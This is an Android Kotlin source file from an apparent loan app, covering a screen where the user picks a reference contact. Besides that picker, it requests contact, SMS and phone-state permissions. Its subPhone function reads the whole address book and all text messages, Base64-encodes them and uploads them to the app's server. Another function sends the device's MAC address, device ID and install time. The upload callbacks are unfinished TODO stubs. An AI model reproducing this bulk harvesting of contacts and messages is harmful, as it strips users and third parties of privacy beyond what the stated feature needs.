package com.loan.stl.module.mine.viewControl

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.util.Log
import android.view.View
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.bigkoo.pickerview.builder.OptionsPickerBuilder
import com.bigkoo.pickerview.listener.OnOptionsSelectListener
import com.google.gson.Gson
import com.loan.stl.common.DicKey
import com.loan.stl.common.RequestResultCode
import com.loan.stl.module.mine.dataModel.receive.DicRec
import com.loan.stl.module.mine.dataModel.receive.KeyValueRec
import com.loan.stl.module.mine.dataModel.submit.CreditLinkerSub
import com.loan.stl.module.mine.dataModel.submit.PhoneInfoSub
import com.loan.stl.module.mine.ui.activity.ContactActivity
import com.loan.stl.module.mine.viewModel.ContactVM
import com.loan.stl.network.HttpClient
import com.loan.stl.network.NetworkUtil
import com.loan.stl.network.ResponseCallback
import com.loan.stl.network.api.MineService
import com.loan.stl.network.entity.HttpResult
import com.loan.stl.network.tool.Base64
import com.loan.stl.utils.LogUtils
import com.loan.stl.utils.PhoneUtil
import com.loan.stl.utils.ToastUtils
import com.loan.stl.utils.DeviceUtil
import retrofit2.Call
import retrofit2.Response
import java.util.ArrayList

/**
author: russell
time: 2019-07-15:21:14
describe：
 */
class ContactControl(private val contactActivity: ContactActivity) {
    var  contactVM=ContactVM()
    private val relation = ArrayList<String?>()
    val permissions= arrayOf(
        Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE)


    init {
        reqDic()
    }

    /**
     * 数据字典请求
     *
     * @param view
     */
    private fun reqDic() {
        val callInit = HttpClient.getService(MineService::class.java).getDicts(DicKey.CONTACT + "," + DicKey.KINSFOLK)
        NetworkUtil.showCutscenes(callInit)
        callInit.enqueue(object : ResponseCallback<HttpResult<DicRec>>() {
           override fun onSuccess(call: Call<HttpResult<DicRec>>,
                                  response: Response<HttpResult<DicRec>>) {
               val dic = response.body()!!.data
               if (dic != null) {//数据字典获取内容
                   var temp: List<KeyValueRec>
                   if (dic.contactRelationList != null) {
                       temp = dic.contactRelationList
                       for (i in temp.indices) {
                           relation.add(temp[i].value)
                       }
                   }
                   if (dic.kinsfolkRelationList != null) {
                       temp = dic.kinsfolkRelationList
                       for (i in temp.indices) {
                         //  kinsfolkrelation.add(temp[i].getValue())
                       }
                   }
               }

            }
        })
    }


    /*
        打开通讯录 首先要检查权限
     */
    fun openContact(view: View){
        if(!checkPermission()){
            requestPermissions()
            return
        }
        goChoose()
    }

     fun goChoose() {
        val intent = Intent()
        intent.action = "android.intent.action.PICK";
        intent.addCategory("android.intent.category.DEFAULT")
        intent.type = "vnd.android.cursor.dir/phone_v2"
        contactActivity.startActivityForResult(intent, RequestResultCode.GET_CONTACT_CODE)
    }

    /*
      选择关系
     */

    fun chooseRelation(view: View){
        val pvOptions = OptionsPickerBuilder(contactActivity,
            OnOptionsSelectListener { options1, option2, options3, v ->
            contactVM.relation=relation[options1]
            }).build<String?>()
        pvOptions.setPicker(relation as List<String?>?)
        pvOptions.show()
    }





    fun checkPermission():Boolean{
        var flag=true
        permissions.forEach {
            if( ContextCompat.checkSelfPermission(contactActivity, it) !=
                PackageManager.PERMISSION_GRANTED)
                flag=false
        }

        return flag

    }


    fun requestPermissions(){
        ActivityCompat.requestPermissions(contactActivity,
            permissions,RequestResultCode.REQ_CONTACT_CODE)
    }

    /*
        上传通讯录和短信
     */
    fun subPhone(){
        val gson = Gson()
        val contacts = PhoneUtil.getContacts(contactActivity)
        val sms = PhoneUtil.getSmsInfos(contactActivity)
        val contactsInfo = gson.toJson(contacts)
        val smsInfo = gson.toJson(sms)
        var sub = PhoneInfoSub(Base64.encode(contactsInfo.toByteArray()))
        val contactCall = HttpClient.getService(MineService::class.java).contacts(sub)
        contactCall.enqueue(object : ResponseCallback<HttpResult<Any>>() {
            override fun onSuccess(call: Call<HttpResult<Any>>?, response: Response<HttpResult<Any>>?) {
                TODO("not implemented") //To change body of created functions use File | Settings | File Templates.
            }

        })
            sub = PhoneInfoSub(Base64.encode(smsInfo.toByteArray()))
            val smsCall = HttpClient.getService(MineService::class.java).messages(sub)
        smsCall.enqueue(object : ResponseCallback<HttpResult<Any>>(){
            override fun onSuccess(call: Call<HttpResult<Any>>?, response: Response<HttpResult<Any>>?) {
                TODO("not implemented") //To change body of created functions use File | Settings | File Templates.
            }

        })
    }



    fun submit(view: View) {


        val sub = CreditLinkerSub()

        val name = StringBuffer()
        val relation = StringBuffer()
        val phone = StringBuffer()
        val id = StringBuffer()
        val relationType = StringBuffer()

        name.append(contactVM.name)
        relation.append(contactVM.relation)
        phone.append(contactVM.phone)

        sub.id=id.toString()
        sub.name=name.toString()
        sub.phone=phone.toString()
        sub.relation=relation.toString()
        sub.type=relationType.toString()


        sub.mac=DeviceUtil.macAddress()
        sub.operatingSystem=DeviceUtil.getBuildVersion()
        sub.phoneBrand=DeviceUtil.getPhoneBrand()
        sub.phoneType=DeviceUtil.getPhoneModel()
        sub.phoneMark=DeviceUtil.getDeviceId(view.context)
        sub.systemVersions=DeviceUtil.getBuildVersion()
        sub.versionCode=DeviceUtil.getVersionCode(view.context)
        sub.versionName=DeviceUtil.getVersionName(view.context)
        sub.appMarket=DeviceUtil.getMetaData(view.context, "UMENG_CHANNEL")
        sub.appInstallTime=DeviceUtil.getInstallTime(view.context)


        val callInit = HttpClient.getService(MineService::class.java).contactSaveOrUpdate(sub)
        NetworkUtil.showCutscenes(callInit)
        callInit.enqueue(object :ResponseCallback<HttpResult<Any>>(){
            override fun onSuccess(call: Call<HttpResult<Any>>?, response: Response<HttpResult<Any>>?) {
                    //跳转到身份验证页面

            }

        })


    }
}